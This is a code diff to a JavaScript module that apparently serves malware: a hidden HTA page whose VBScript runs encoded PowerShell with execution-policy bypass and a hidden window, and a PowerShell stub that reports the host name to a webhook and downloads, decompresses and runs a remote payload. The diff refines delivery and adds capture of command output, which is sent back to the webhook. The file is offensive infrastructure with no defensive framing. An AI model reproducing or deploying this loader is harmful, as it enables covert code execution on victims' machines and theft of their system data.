@@ -5,12 +5,13 @@ const AMSI = String.raw`try{Add-Type -TypeDefinition 'using System;using System.
 function stub(base) {
   return "$ErrorActionPreference='Stop'"
     + ";$ProgressPreference='SilentlyContinue'"
+    + ";[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12"
     + ";$wh='" + WH + "'"
-    + ";function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15}catch{}}"
+    + ";function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 20 -UseBasicParsing}catch{}}"
     + ";P ('stub : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion)"
     + ";$p='" + base + "/a?_=" + Date.now() + "'"
     + ";try{"
-    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String((irm $p)))"
+    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String((irm $p -UseBasicParsing -TimeoutSec 30)))"
     + ";$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress)"
     + ";$o=New-Object IO.MemoryStream;$d.CopyTo($o)"
     + ";$t=[Text.Encoding]::UTF8.GetString($o.ToArray())"
@@ -29,7 +30,7 @@ module.exports = (req, res) => {
     const hta = String.raw`<html><head><title>v</title>
 <HTA:APPLICATION ID="x" SHOWINTASKBAR="no" CAPTION="no" WINDOWSTATE="minimize" SINGLEINSTANCE="yes"/>
 </head><body><script language="VBScript">
-Dim sh, rc
+Dim sh, rc, ex, so, se
 Sub P(m)
   On Error Resume Next
   Dim h
@@ -41,14 +42,19 @@ End Sub
 On Error Resume Next
 Set sh = CreateObject("WScript.Shell")
 P "hta : " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-rc = sh.Run("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ni -w h -ep bypass -enc ${enc}", 0, True)
+Set ex = sh.Exec("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ni -w h -ep bypass -enc ${enc}")
 If Err.Number <> 0 Then
-  P "run err : " & Err.Number & " | " & Err.Description
+  P "exec err : " & Err.Number & " | " & Err.Description
   Err.Clear
-  sh.ShellExecute "powershell.exe", "-nop -ni -w h -ep bypass -enc ${enc}", "", "open", 0
-  P "retried via shellexecute"
 Else
-  P "exit : " & rc
+  Do While ex.Status = 0
+    sh.Sleep 150
+  Loop
+  se = ex.StdErr.ReadAll()
+  so = ex.StdOut.ReadAll()
+  P "exit : " & ex.ExitCode
+  If Len(se) > 0 Then P "stderr : " & Left(se, 1200)
+  If Len(so) > 0 Then P "stdout : " & Left(so, 1200)
 End If
 window.close
 </script></body></html>`;
